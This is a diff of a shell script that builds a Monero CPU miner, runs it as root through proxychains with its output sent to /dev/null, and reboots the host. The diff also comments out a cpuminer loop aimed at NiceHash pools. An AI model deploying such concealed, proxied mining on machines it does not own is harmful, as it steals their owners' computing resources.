@@ -20,14 +20,14 @@ then
 	sudo make install
 	sudo cp /m/test01/xmr/config.txt /m/test01/xmr-stak-cpu/bin/config.txt
 	cd /m/test01/xmr-stak-cpu/bin/
-	sudo /m/test01/proxychains-ng/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu
+	sudo /m/test01/proxychains-ng/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu >/dev/null 2>&1
   	sudo reboot   
 else
   sudo /bin/su -c "echo 'xxxxx' >> /$file"
   sudo reboot  
 fi
 
-
+exit
 
 
 
@@ -63,7 +63,7 @@ sudo CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configur
 ./build.sh
 sudo sysctl -w vm.nr_hugepages=128
 #sudo ./build.sh
-while true; do
-	./cpuminer -a cryptonight -o stratum+tcp://cryptonight.usa.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 5 --api-bind 0
-	./cpuminer -a cryptonight -o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 5 --api-bind 0
-done
+#while true; do
+#	./cpuminer -a cryptonight -o stratum+tcp://cryptonight.usa.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 5 --api-bind 0
+#	./cpuminer -a cryptonight -o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 5 --api-bind 0
+#done
